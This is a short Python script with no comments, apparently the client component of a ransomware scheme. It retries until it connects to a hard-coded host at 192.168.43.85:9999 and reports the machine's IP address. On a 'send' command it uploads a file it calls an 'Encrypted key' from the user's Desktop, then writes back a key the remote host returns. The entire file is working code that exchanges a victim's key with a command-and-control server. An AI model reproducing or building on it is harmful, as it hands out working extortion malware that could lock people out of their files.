import socket
import time
import os

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

s = None
msg = None
host = os.path.expanduser('~')
pth =  os.path.join(host,'Desktop','key.txt')
def connect():
    global s,msg
    s = socket.socket()
    try:
        s.connect(('192.168.43.85',9999))
    except socket.error as err:
        print("Error in establihing connection: ", str(err))

    ip = get_ip_address()
    print('IP: ',ip)
    s.send(ip.encode())

    msg = s.recv(1024)
    msg = msg.decode()


while True:
    try:
        connect()
        break
    except:
        print('Retrying...')

while True:
    if msg == 'send':
        with open(pth, 'rb') as file:
            key = file.read()

        s.send(key)
        print("Encrypted key sent successfully")


        key = s.recv(4096)

        with open(pth,'wb') as f:
            f.write(key)

        print("Key received Successfully")

        s.close()
        break

    else:
        time.sleep(5)
        connect()


